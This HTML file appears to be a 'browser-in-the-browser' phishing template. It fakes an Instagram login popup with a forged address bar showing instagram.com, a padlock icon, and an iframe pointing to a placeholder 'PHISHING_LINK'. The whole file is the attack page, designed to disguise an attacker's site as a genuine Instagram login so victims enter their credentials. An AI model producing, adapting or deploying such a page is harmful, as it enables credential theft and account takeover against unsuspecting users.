<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="style.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
<div id="window">
<!-- Title bar start -->
<div id="title-bar-width">
	<div id="title-bar">
		<div style="margin-top:5px;">
			<img src="logo.svg" width="20px" height="15px" id="logo">
			<span id="logo-description">Login with Instagram</span>
		</div>
	</div>
	<div id="url-bar">
		<img src="ssl.svg" width="20px" height="20px" id="ssl-padlock">
		<span id="domain-name">https://www.instagram.com/</span>
		<span id="domain-path">accounts/login/</span>
	</div>
</div>
<!-- Content start -->
<iframe id="content" src="PHISHING_LINK" frameBorder="0"></iframe>
</div>
</body>
<script src="script.js"></script>
</html>
